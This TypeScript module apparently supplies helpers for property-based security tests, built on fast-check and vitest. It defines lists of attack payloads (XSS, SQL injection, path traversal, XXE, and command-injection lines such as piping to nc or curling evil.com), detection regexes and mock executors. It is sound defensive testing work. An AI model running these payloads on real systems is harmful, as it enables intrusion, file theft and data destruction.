import * as fc from 'fast-check';
import { expect } from 'vitest';

/**
 * Common security test utilities and helpers
 * Provides reusable patterns and configurations for security testing
 */

export interface SecurityTestConfig {
  maxStringLength: number;
  maxArraySize: number;
  maxDepth: number;
  maxIterations: number;
  timeout: number;
}

export const DEFAULT_SECURITY_CONFIG: SecurityTestConfig = {
  maxStringLength: 10 * 1024 * 1024, // 10MB
  maxArraySize: 100000,
  maxDepth: 1000,
  maxIterations: 1000,
  timeout: 10000 // 10 seconds
};

/**
 * Common malicious patterns for different attack types
 */
export const ATTACK_PATTERNS = {
  script_injection: [
    '<script>alert("xss")</script>',
    '<img src="x" onerror="alert(1)"/>',
    '<svg onload="alert(1)"/>',
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '</script><script>alert(1)</script>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<object data="javascript:alert(1)"></object>'
  ],
  
  command_injection: [
    '; rm -rf /',
    '&& curl http://evil.com',
    '| nc evil.com 9999',
    '`whoami`',
    '$(id)',
    '${evil}',
    '& format C:',
    '|| rm -rf /',
    '; cat /etc/passwd',
    '&& wget malicious.com/payload'
  ],
  
  path_traversal: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '/etc/shadow',
    'C:\\Windows\\System32\\drivers\\etc\\hosts',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd',
    '~/.ssh/id_rsa',
    '/proc/self/environ',
    '/dev/random'
  ],
  
  format_string: [
    '%s%s%s%s%s%s%s%s%s%s',
    '%x%x%x%x%x%x%x%x%x%x',
    '%n%n%n%n%n%n%n%n%n%n',
    '%08x.%08x.%08x.%08x',
    '%.2047d',
    '%*.*s',
    '${jndi:ldap://evil.com/a}',
    '%{#context["xwork.MethodAccessor.denyMethodExecution"]=false}',
    '%{T(java.lang.System).exit(1)}'
  ],
  
  xml_injection: [
    '&lt;malicious&gt;',
    '&#60;script&#62;alert(1)&#60;/script&#62;',
    '&amp;#60;script&amp;#62;',
    '&quot;><script>alert(1)</script>',
    '&apos;><script>alert(1)</script>',
    '<!DOCTYPE html>',
    '<?xml version="1.0"?>',
    '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
    '<!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">'
  ],
  
  css_injection: [
    'color: red; background: url(javascript:alert(1))',
    'color: red; expression(alert(1))',
    'color: red; -moz-binding: url(http://evil.com/evil.xml)',
    'color: red; behavior: url(evil.htc)',
    'color: red</style><script>alert(1)</script>',
    'color: red; @import url(http://evil.com/evil.css)',
    'color: red; background: url(data:text/html,<script>alert(1)</script>)',
    'color: red; position: fixed; top: 0; left: 0; width: 100%; height: 100%'
  ],
  
  sql_injection: [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "'; SELECT * FROM users WHERE '1'='1",
    "' UNION SELECT password FROM users WHERE '1'='1",
    "'; INSERT INTO users VALUES ('evil', 'password'); --",
    "' OR 1=1#",
    "'; EXEC xp_cmdshell('dir'); --",
    "' AND (SELECT COUNT(*) FROM users) > 0 --"
  ],
  
  url_injection: [
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox("xss")',
    'file:///etc/passwd',
    'ftp://malicious.com/payload',
    '//evil.com/payload',
    'javascript:eval(atob("YWxlcnQoMSk="))',
    'data:application/javascript,alert(1)',
    'view-source:http://example.com',
    'jar:http://evil.com!/payload'
  ]
};

/**
 * Fast-check arbitraries for security testing
 */
export const SecurityArbitraries = {
  /**
   * Generate malicious strings for a specific attack type
   */
  maliciousString: (attackType: keyof typeof ATTACK_PATTERNS) =>
    fc.constantFrom(...ATTACK_PATTERNS[attackType]),

  /**
   * Generate any malicious string from all attack types
   */
  anyMaliciousString: () =>
    fc.constantFrom(...Object.values(ATTACK_PATTERNS).flat()),

  /**
   * Generate potentially dangerous file paths
   */
  dangerousPath: () =>
    fc.constantFrom(...ATTACK_PATTERNS.path_traversal),

  /**
   * Generate large strings that might cause memory issues
   */
  largeString: (config: Partial<SecurityTestConfig> = {}) => {
    const maxLen = config.maxStringLength || DEFAULT_SECURITY_CONFIG.maxStringLength;
    return fc.string({ minLength: 1000, maxLength: Math.min(maxLen, 100000) });
  },

  /**
   * Generate deeply nested structures
   */
  deepStructure: (config: Partial<SecurityTestConfig> = {}) => {
    const maxDepth = config.maxDepth || DEFAULT_SECURITY_CONFIG.maxDepth;
    return fc.integer({ min: 100, max: Math.min(maxDepth, 5000) });
  },

  /**
   * Generate binary data that might cause encoding issues
   */
  binaryData: () =>
    fc.array(fc.integer({ min: 0, max: 255 }), { minLength: 1, maxLength: 1000 }),

  /**
   * Generate control characters and special bytes
   */
  controlCharacters: () =>
    fc.constantFrom(
      '\x00', '\x01', '\x02', '\x03', '\x04', '\x05', '\x06', '\x07',
      '\x08', '\x0B', '\x0C', '\x0E', '\x0F', '\x7F', '\xFF'
    ),

  /**
   * Generate potentially malicious URLs
   */
  maliciousUrl: () =>
    fc.constantFrom(...ATTACK_PATTERNS.url_injection),

  /**
   * Generate dangerous attribute values
   */
  dangerousAttribute: () =>
    fc.oneof(
      fc.constantFrom(...ATTACK_PATTERNS.script_injection),
      fc.constantFrom(...ATTACK_PATTERNS.css_injection),
      fc.constantFrom(...ATTACK_PATTERNS.url_injection),
      fc.float({ min: -1e10, max: 1e10 }),
      fc.constantFrom('NaN', 'Infinity', '-Infinity')
    )
};

/**
 * Common test patterns for security validation
 */
export class SecurityTestPatterns {
  /**
   * Test that a function safely handles malicious input
   */
  static testMaliciousInputHandling<T>(
    testFn: (input: string) => T,
    attackType: keyof typeof ATTACK_PATTERNS,
    options: { numRuns?: number; timeout?: number } = {}
  ) {
    return fc.assert(
      fc.property(SecurityArbitraries.maliciousString(attackType), (input) => {
        try {
          const result = testFn(input);
          // Function should either succeed safely or throw proper error
          expect(result).toBeDefined();
          return true;
        } catch (error) {
          expect(error).toBeInstanceOf(Error);
          return true;
        }
      }),
      {
        numRuns: options.numRuns || 100,
        timeout: options.timeout || DEFAULT_SECURITY_CONFIG.timeout
      }
    );
  }

  /**
   * Test that output doesn't contain dangerous patterns
   */
  static testOutputSanitization(
    processFn: (input: string) => string,
    dangerousPatterns: RegExp[],
    options: { numRuns?: number } = {}
  ) {
    return fc.assert(
      fc.property(SecurityArbitraries.anyMaliciousString(), (input) => {
        try {
          const output = processFn(input);
          
          // Check that dangerous patterns are not present in output
          for (const pattern of dangerousPatterns) {
            expect(output).not.toMatch(pattern);
          }
          
          return true;
        } catch (error) {
          expect(error).toBeInstanceOf(Error);
          return true;
        }
      }),
      { numRuns: options.numRuns || 100 }
    );
  }

  /**
   * Test resource exhaustion protection
   */
  static testResourceExhaustion<T>(
    resourceFn: (size: number) => T,
    maxAllowed: number,
    options: { numRuns?: number; timeout?: number } = {}
  ) {
    return fc.assert(
      fc.property(
        fc.integer({ min: maxAllowed, max: maxAllowed * 10 }),
        (size) => {
          try {
            const result = resourceFn(size);
            // Should either succeed with limited resource or throw error
            expect(result).toBeDefined();
            return true;
          } catch (error) {
            expect(error.message).toMatch(/limit|size|memory|resource/i);
            return true;
          }
        }
      ),
      {
        numRuns: options.numRuns || 50,
        timeout: options.timeout || DEFAULT_SECURITY_CONFIG.timeout
      }
    );
  }

  /**
   * Test circular reference detection
   */
  static testCircularReferenceDetection<T>(
    createCircularFn: (depth: number) => T,
    detectFn: (obj: T) => { hasCircle: boolean },
    options: { numRuns?: number } = {}
  ) {
    return fc.assert(
      fc.property(
        fc.integer({ min: 2, max: 100 }),
        (depth) => {
          try {
            const circularObj = createCircularFn(depth);
            const result = detectFn(circularObj);
            
            // Should detect circular references
            expect(result.hasCircle).toBe(true);
            
            return true;
          } catch (error) {
            expect(error).toBeInstanceOf(Error);
            return true;
          }
        }
      ),
      { numRuns: options.numRuns || 30 }
    );
  }
}

/**
 * Security validation utilities
 */
export class SecurityValidators {
  /**
   * Check if string contains dangerous script patterns
   */
  static hasScriptInjection(str: string): boolean {
    const patterns = [
      /<script[^>]*>/i,
      /javascript:/i,
      /vbscript:/i,
      /on\w+\s*=/i,
      /data:text\/html.*script/i
    ];
    return patterns.some(pattern => pattern.test(str));
  }

  /**
   * Check if string contains path traversal attempts
   */
  static hasPathTraversal(str: string): boolean {
    const patterns = [
      /\.\.\//,
      /\.\.\\/,
      /%2e%2e%2f/i,
      /%2e%2e%5c/i,
      /\/etc\//,
      /\/proc\//,
      /\/sys\//,
      /C:\\Windows/i
    ];
    return patterns.some(pattern => pattern.test(str));
  }

  /**
   * Check if string contains command injection attempts
   */
  static hasCommandInjection(str: string): boolean {
    const patterns = [
      /[;&|`$()]/,
      /\$\(/,
      /\|\s*(nc|netcat|curl|wget)/i,
      /(rm|del|format)\s+.*[\/\\]/i
    ];
    return patterns.some(pattern => pattern.test(str));
  }

  /**
   * Validate that object doesn't have dangerous properties
   */
  static hasPrototypePollution(obj: any): boolean {
    if (!obj || typeof obj !== 'object') return false;
    
    const dangerousKeys = ['__proto__', 'constructor', 'prototype'];
    return dangerousKeys.some(key => key in obj);
  }

  /**
   * Check if size exceeds safe limits
   */
  static exceedsSizeLimit(size: number, limit: number = DEFAULT_SECURITY_CONFIG.maxStringLength): boolean {
    return size > limit;
  }
}

/**
 * Performance monitoring for security tests
 */
export class SecurityPerformanceMonitor {
  private static measurements: Map<string, number[]> = new Map();

  static startMeasurement(testName: string): () => number {
    const start = performance.now();
    return () => {
      const duration = performance.now() - start;
      this.recordMeasurement(testName, duration);
      return duration;
    };
  }

  static recordMeasurement(testName: string, duration: number): void {
    if (!this.measurements.has(testName)) {
      this.measurements.set(testName, []);
    }
    this.measurements.get(testName)!.push(duration);
  }

  static getAverageTime(testName: string): number {
    const times = this.measurements.get(testName) || [];
    return times.length > 0 ? times.reduce((a, b) => a + b, 0) / times.length : 0;
  }

  static detectPerformanceAnomaly(testName: string, threshold: number = 5000): boolean {
    return this.getAverageTime(testName) > threshold;
  }

  static reset(): void {
    this.measurements.clear();
  }
}

/**
 * Mock factory for creating test doubles
 */
export class SecurityMockFactory {
  /**
   * Create a mock parser that can be configured to handle malicious input
   */
  static createMockParser(config: {
    shouldThrow?: boolean;
    maxInputSize?: number;
    sanitizeOutput?: boolean;
  } = {}) {
    return (input: string) => {
      if (config.maxInputSize && input.length > config.maxInputSize) {
        throw new Error(`Input size ${input.length} exceeds limit ${config.maxInputSize}`);
      }

      if (config.shouldThrow && SecurityValidators.hasScriptInjection(input)) {
        throw new Error('Dangerous script detected');
      }

      let output = input;
      if (config.sanitizeOutput) {
        output = output
          .replace(/<script[^>]*>.*?<\/script>/gi, '')
          .replace(/javascript:/gi, 'sanitized:')
          .replace(/on\w+\s*=\s*["'][^"']*["']/gi, '');
      }

      return { input, output, safe: !SecurityValidators.hasScriptInjection(output) };
    };
  }

  /**
   * Create a mock command executor with security controls
   */
  static createMockCommandExecutor(config: {
    allowedCommands?: string[];
    blockDangerous?: boolean;
    maxExecutionTime?: number;
  } = {}) {
    return (command: string, args: string[] = []) => {
      const fullCommand = `${command} ${args.join(' ')}`;

      if (config.blockDangerous && SecurityValidators.hasCommandInjection(fullCommand)) {
        throw new Error('Dangerous command detected');
      }

      if (config.allowedCommands && !config.allowedCommands.includes(command)) {
        throw new Error(`Command not allowed: ${command}`);
      }

      return {
        command,
        args,
        executed: true,
        safe: true,
        executionTime: Math.random() * (config.maxExecutionTime || 1000)
      };
    };
  }
}